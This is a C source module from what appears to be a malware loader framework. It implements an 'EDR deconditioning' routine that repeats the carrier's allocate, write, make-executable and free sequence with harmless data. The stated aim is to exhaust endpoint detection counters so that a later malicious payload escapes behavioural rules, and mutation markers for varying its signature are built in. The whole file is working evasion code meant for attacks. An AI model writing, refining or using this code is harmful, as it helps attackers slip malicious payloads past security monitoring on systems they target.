/* MODULE: DECONDITIONER
 * TYPE: basic
 * DESC: Research-informed deconditioning template (Decondition Everything).
 *
 *       Mirrors the carrier's alloc->write->protect->[exec]->free pattern with
 *       benign data for N rounds. Theory: EDR behavioral rules have per-process
 *       cutoff counters. After N benign triggers, the counter overflows and
 *       subsequent triggers (including malicious) bypass the rule.
 *
 *       Key parameters (varied by AST mutations):
 *       - decon_rounds:           iteration count (must exceed EDR cutoff)
 *       - fill_pattern:           benign data type (affects entropy-based scans)
 *       - exec_decoy:             execute from alloc'd memory (normalizes #1 signal)
 *       - timing_pattern:         delays between API calls (affects temporal tokens)
 *       - protection_transition:  memory protection changes (must match carrier rule)
 *
 *       Default: 20 rounds, XOR fill, no execution, no delay, RW->RX.
 */
#include "../header/definitions.h"

#ifndef DECON_ROUNDS
#define DECON_ROUNDS 20
#endif

FORCE_INLINE void deconditioner() {
    DWORD old_prot;

    // @MUTATE:decon_rounds
    for (int i = 0; i < DECON_ROUNDS; i++) {

        char *buf = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
        if (!buf) continue;

        // @MUTATE:fill_pattern
        for (int k = 0; k < PAYLOAD_LEN; k++) {
            buf[k] = (char)(k ^ (i + 0x41));
        }

        // @MUTATE:timing_pattern
        // @MUTATE:protection_transition
        VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot);

        // @MUTATE:exec_decoy

        // @MUTATE:timing_pattern
        VirtualFree(buf, 0, 0x8000);
    }
}
